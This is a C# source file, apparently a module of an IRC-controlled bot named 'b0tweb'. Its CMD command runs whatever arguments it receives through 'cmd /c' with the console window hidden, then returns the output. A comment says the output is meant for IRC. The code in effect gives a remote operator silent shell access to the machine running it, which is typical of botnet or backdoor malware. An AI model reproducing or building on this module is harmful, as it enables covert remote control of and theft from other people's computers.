using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace b0tweb.Commands
{
    class CMDCommand : AbstractCommand
    {
        public override string Command => "CMD";

        protected override string ExecuteCommand(string[] args)
        {
            // see https://www.codeproject.com/Articles/25983/How-to-Execute-a-Command-in-C

            // create the ProcessStartInfo using "cmd" as the program to be run,
            // and "/c " as the parameters.
            // Incidentally, /c tells cmd that we want it to execute the command that follows,
            // and then exit.
            System.Diagnostics.ProcessStartInfo procStartInfo =
                new System.Diagnostics.ProcessStartInfo("cmd", "/c " + String.Join(" ", args))
                {
                    // redirect the stdout to Process.StandardOutput StreamReader.
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    // Do not create the black window.
                    CreateNoWindow = true
                };

            // Now we create a process, assign its ProcessStartInfo and start it
            System.Diagnostics.Process proc = new System.Diagnostics.Process
            {
                StartInfo = procStartInfo
            };

            proc.Start();

            // Get the output into a string
            string result = proc.StandardOutput.ReadToEnd();

            // Display the command output.
            return result; // TODO: Temporary. Need a way to nicely propogate results to irc
        }
    }
}
